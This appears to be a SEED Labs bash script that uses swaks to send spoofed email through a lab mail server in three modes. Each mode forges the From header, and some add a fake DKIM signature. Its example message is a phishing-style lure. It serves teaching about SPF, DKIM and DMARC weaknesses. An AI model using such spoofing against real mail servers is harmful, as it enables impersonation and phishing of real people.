#!/usr/bin/bash

# This script is meant to be run from the interactive shell inside the attacker container in the SEED Labs Docker network setup

# This particular attack is meant to show what an SPF bypass attack looks like

# From attacker container (10.9.0.7)
# Send email from victim's domain using swaks

# IP addresses from the containers
ATTACKER_IP="10.9.0.7"
MAIL_SERVER_IP="10.9.0.6" # aka VICTIM
DNS_SERVER_IP="10.9.0.5"  # DNS

# check if the number of args is correct
if [ $# -eq 2 ] && [ "$1" == "--help" ]; then
  help
elif [ $# -ne 5 ] && [ "$1" != "--help" ]; then
    echo "Usage: $0 <attack_mode> <sender-email> <destination-email> <message> <fake-sender-email>"
    exit 1
fi

attack_mode=$1
sender=$2
target=$3
message=$4
sender_fake=$5

# These are cvariables with the output file names
EMAIL_FILE="attack-${attack_mode}.log"

send_email() {

local mode=$1

if [ "$mode" = "spf" ]; then
  swaks --from "$sender" --to "$target" \
    --server "$MAIL_SERVER_IP" --port 25 \
    --header "From: ${sender_fake}" \
    --header "To: ${target}" \
    --helo mail.attacker.test \
    --header "Subject: SPF Test" \
    --body "$message" \
    --raw 2>/dev/null | tee "$EMAIL_FILE"

elif [ "$mode" = "dkim" ]; then
  swaks --from "$sender" --to "$target" \
    --server "$MAIL_SERVER_IP" --port 25 \
    --header "From: $sender_fake" \
    --header "To: $target" \
    --helo mail.attacker.test \
    --header "Subject: DKIM Test" \
    --body "$message" \
    --header "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=victim.test; s=mail; h=from:to:subject; bh=invalidhash; b=invaliddata" \
    --raw 2>/dev/null | tee "$EMAIL_FILE"
    
elif [ "$mode" = "dmarc" ]; then
  swaks --from "$sender" --to "$target" \
    --server "$MAIL_SERVER_IP" --port 25 \
    --header "From: $sender_fake" \
    --header "To: $target" \
    --helo mail.attacker.test \
    --header "Subject: DMARC Test" \
    --body "$message" \
    --header "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=victim.test; s=mail; h=from:to:subject; bh=bad; b=bad" \
    --raw 2>/dev/null | tee "$EMAIL_FILE"


else
  echo
  echo "The argument provided for the attack mode is not available or may have a typo."
  echo
  help
  exit 1
fi

}

print_logs() {
  sleep 5
  echo ""
  echo ""
  echo "Email Headers"
  cat -n "$EMAIL_FILE" | grep -E -i -A3 -B1 'MAIL FROM|RCPT'
}

help() {
  echo "Usage: $0 <attack_mode> <sender-email> <destination-email> <message> <sender-faker>"
  echo
  echo "------------------------------------------------------------------------------------------"
  echo
  echo "Modes of attack:"
  echo
  echo "   spf:   sends spoofed email as the fake email the attacker provides"
  echo "            relying on misconfiguration of the SPF auth layer"
  echo "   dkim:  sends spoofed email as the fake email the attacker provides"
  echo "            relying on misconfiguration of the DKIM auth layer"
  echo "   dmarc: sends spoofed email as the fake email the attacker provides"
  echo "            relying on misconfiguration of the DMARC auth layer"
  echo
  echo "------------------------------------------------------------------------------------------"
  echo
  echo " Example: ./attack.sh spf "alice@victim.test" "bob@victim.test" "Hello Bob! Click this link to win 100USD https://100.usd.free.com!" "attacker@victim.test" "
  exit 1
}

if [ -z "$1" ]; then
  help
  exit 1
fi

# Function Calls
send_email "$attack_mode"
print_logs